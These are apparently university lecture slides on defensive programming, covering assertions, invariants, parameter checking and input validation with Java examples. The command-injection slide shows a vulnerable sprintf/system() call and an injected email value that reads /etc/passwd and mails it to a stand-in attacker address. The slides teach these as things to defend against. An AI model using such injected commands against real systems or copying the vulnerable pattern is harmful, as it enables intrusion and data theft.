---
author:
- Isaac Griffith
title: Defensive Programming - Assertions and Input Validation
institute: |
  SE 5520 - Software Construction and Configuration Management

  Department of Software Engineering

  Idaho State University
fontsize: 12pt
cornerLogo: "../../../images/spirit.png"
wideLogo: "../../../images/wide.png"
lowerCornerLogo: "../../../images/roar.eps"
...

# Outcomes

At the end of Today's Lecture you will be able to:

::: columns
:::: {.column width=.7}
* Understand and utilize assertions in your daily practice
* Know the benefits of assertions
* Understand the need for parameter checking and input validation
::::
:::: {.column width=.25}
\vskip-2em
\centering
\includegraphics[width=\textwidth]{../../../images/brain-gears.jpg}
::::
:::

# Inspiration


#

\centering
\vfill
\begin{minipage}{.75\textwidth}
\begin{minipage}{3.5em}
\vskip-3em
\includegraphics[width=\textwidth]{../../../images/bengal-black.png}
\end{minipage}
\begin{minipage}{.75\textwidth}
\Huge Defensive Programming
\vskip-0.75em
\rule{\textwidth}{2pt}

\large \color{Roarange}\textbf{SE 5520}
\end{minipage}
\end{minipage}

# Defensive Programming

* There can always be errors (e.g. scarce resources)
* Procedures defend themselves from errors
* Use special unchecked exception `FailureException`
* Not listed in specification!
* Raise when some assumption doesn't hold, i.e.,
  - breach of contract

# Defensive Programming

* Good programming practices that protect you from your own programming mistakes, as well as those of others
  - Assertions
  - Parameter Checking

# Assertions

* As we write code, we make many assumptions about the state of the program and the data it processes
  - A variable's value is in a particular range
  - A file exists, is writable, is open, etc.
  - The maximum size of the data is N (e.g., 1000)
  - The data is sorted
  - A network connection to another machine was successfully opened
  - ...
* The correctness of our program depends on the validity of our assumptions
* Faulty assumptions result in buggy, unreliable code

# Assertions

* Boolean expressions
* Used to check:
  - Pre-conditions
    - reflect **requires** clause
    - Test client
  - Post-conditions
    - reflect **effects** clause
    - test procedure
  - Invariants
* Include specification in the software

# Invariants

* **Invariant** -- "A rule, such as the ordering of an ordered list or heap, that applies throughout the life of a data structure or procedure. Each change to the data structure must maintain the correctness of the invariant"

* **Class Invariant** -- if the "data structure" above is a class

# Invariants Example

```java
class CharStack {
  private char[] cArr; // internal rep
  private int i = 0;
  void push (char c) {
    cArr[i] = c;
    i++;
  }
}
```

* The invariant in this example is: "**i** should always be equal to the size of the stack (i.e., point at one above at the top of the stack)"

# Assertions in Java

* Added in JDK 1.4
* General Syntax:

```java
assert expression1 : expression2
```

* Examples:

```java
assert value >= 0;
assert someInvariantTrue();
assert value >= 0 : "Value must be > 0: value = " + value;
```

* `> javac *.java`
* `> java -ea MyClass`

# Handling Assertions in Java

* Evaluate $expression_1$
  - If true
    - No further action
  - If false
    - And if $expression_2$ exists
      Evaluate $expression_2$ and throw AssertionError(expression2)
  - Else
    - Use the default AssertionError constructor

# Care with Assertions

* Side effects in assertions

```java
void push (char c) {
  cArr[i] = c;
  assert (i++ == topElement());
}
```

* Change of flow in assertions
* Performance vs. correctness
  - Open issue

# Assertions vs. Exceptions

* If one of my assumptions is wrong, shouldn't I throw an exception rather than use an assertion?
* Assertions are used to find and remove bugs before software is shipped
  - Assertions are turned off in the released software
* Exceptions are used to deal with errors that can occur even if the code is completely correct
  - Out of memory, disk full, file missing, file corrupted, network error, ...

# Assertions vs. Exceptions

```java
// In Class Sensor:
public void setSampleRate(int rate) throws SensorException {
    if (rate < MIN_HERTZ || MAX_HERTZ < rate)
      throw new SensorException("Illegal rate: " + rate);

    this.rate = rate;
}

public void setSampleRate(int rate) {
  assert MIN_HERTZ <= rate && rate <= MAX_HERTZ :
    "Illegal rate: " + rate;

  this.rate = rate;
}
```

# Parameter Checking

* Another important defensive programming technique is "parameter checking"
* A method or function should always check its input parameters to ensure that they are valid
* Two ways to check parameter values
  - assert
  - if statement that throws exception if parameter is invalid
* Which should you use, asserts or exceptions?
\pause
* If you have control over the calling code, use asserts
  - If parameter is invalid, you can fix the calling code
* If you don't have control over the calling code, throw exceptions
  - e.g., your product might be a class library

# Input Validation

* Input validation problems are *the* most common vulnerabilities
  - All programs take user-supplied input
* Programs without input validation could be open to many attacks
* Examples:
  - Format string attacks, SQL injection, command injection, Cross Site Scripting

# General Advice: "All Input is Evil"

* Always check that your input is as you expect
  - Are you expecting a user to enter a color?
    - Verify it's a real color then
    - Or, force them to choose a color from a list
* Assume the worst -- although most of your users are probably going to be "good guys", hackers have access to your program too
* \color{Roarange} Think like an attacker!\color{Black}
  - Think how you might abuse a system with weird input

#

\vfill
\centering
\includegraphics[width=\textwidth]{images/defensive/exploits_of_a_mom.png}

# Sources of Input

::: columns
:::: column
* Command line
* Environment Variables
* File Names
* File Contents (indirect?)
::::
:::: column
This is **not** a complete enumerated list, these are only **examples** You must do input validation of *all* channels where untrusted data comes form (at least).
::::
:::
* Network Connections
* Web-Based Application Inputs: URL, POST, etc.
* Other Inputs
  - Database systems & other external services
  * Registry/System property
  * ...

Which sources of input matter depends on the kind of application, application environment, etc. What follows are *potential* channels

# Minimize the **Attack Surface**

* Make attack surface as small as possible
  - Disable channels (e.g., ports) and methods (APIs)
  - Prevent access to them by attackers (firewall, access control)
* Make sure you know *every* system entry point
  - Network: Scan system to make sure
* For the remaining surface, as soon as possible:
  - Ensure it's authenticated & authorized (if appropriate)
  - Ensure that all untrusted input is valid (input filtering)
    * Untrusted input = Any input from a source not *totally* trusted
    * Failures here are CWE-20: **Improper Input Validation**
  - Many would argue "validate all input", not just untrusted
    * Trusted admins make mistakes too!

# Example: Converting Grades

\footnotesize
```java
import java.util.*;

public class TestScore {
  public static void main(String[] args) {
    Scanner console = new Scanner(System.in);
    System.out.println("Enter test score");
    int testScore = console.nextInt();

    if (testScore >= 90) System.out.println("Your grade is A");
    else if (testScore >= 80) System.out.println("Your grade is B");
    else if (testScore >= 70) System.out.println("Your grade is C");
    else if (testScore >= 60) System.out.println("Your grade is D");
    else System.out.println("Your grade is F");
  }
}
```

\vspace{-1.5em}
\begin{center}
\large
What input-validation problems this program has?

Well, it doesn't check for negative grades or grades greater than 100.
\end{center}

# Is This Security Critical?

* You might think these are just harmless, annoying programming problems
* But some of them might cause security problems
  - Format string attacks
    * The program doesn't expect the input contains things like "%d", "%n", "%s"

# Command Injection

* An application inputs an email address from a user and writes the address to a buffer

```c
sprintf(buffer, "/bin/mail < /tmp/email %s", addr);
```

The buffer is then executed using the `system()` call

* The risk is, of course, that the user enters the following string as an email address;
* `bogus@addr.com; cat /etc/passwd | mail some@badguy.net`

# SQL Injection

\centering
\includegraphics[width=.85\textwidth]{images/defensive/sqlinject1.eps}

# SQL Injection

::: columns
:::: column

\centering
\includegraphics[width=.85\textwidth]{images/defensive/sqlinject2.eps}

::::
:::: column

\centering
\includegraphics[width=.85\textwidth]{images/defensive/sqlinject3.eps}

::::
:::

# XSS

::: columns
:::: column

\centering
\includegraphics[width=.85\textwidth]{images/defensive/xss1.eps}

::::
:::: column

\centering
\includegraphics[width=.85\textwidth]{images/defensive/xss2.eps}

::::
:::

# Summary


# For Next Time

::: columns
:::: {.column width=.6}

::::
:::: {.column width=.4}
\centering
\includegraphics[width=.85\textwidth]{../../../images/next_time.png}
::::
:::

#

\centering
\vfill
\includegraphics[scale=.40]{../../../images/questions.png}

\Huge \textbf{Are there any questions?}
